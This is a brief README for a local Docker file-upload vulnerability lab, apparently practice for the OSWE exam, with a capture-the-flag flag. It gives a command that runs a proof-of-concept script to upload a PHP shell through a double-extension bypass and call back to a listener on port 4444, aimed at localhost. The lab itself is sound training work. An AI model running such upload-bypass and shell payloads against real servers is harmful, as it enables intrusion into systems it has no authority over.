# File Upload Lab (Docker)

```bash
# from labs/
./labctl.sh up file-upload
# or standalone:
docker compose -f docker-compose.yml up -d --build
```

- URL: http://127.0.0.1:8101
- Endpoint: `POST /upload.php` field `file`
- Uploads: `/uploads/<name>`
- Flag: `OSWE{file_upload_lab_flag}`

```bash
python3 ../poc.py 127.0.0.1 8101 127.0.0.1 4444 \
  --endpoint /upload.php --upload-dir /uploads/ --bypass double_ext --shell-type php --command whoami
```
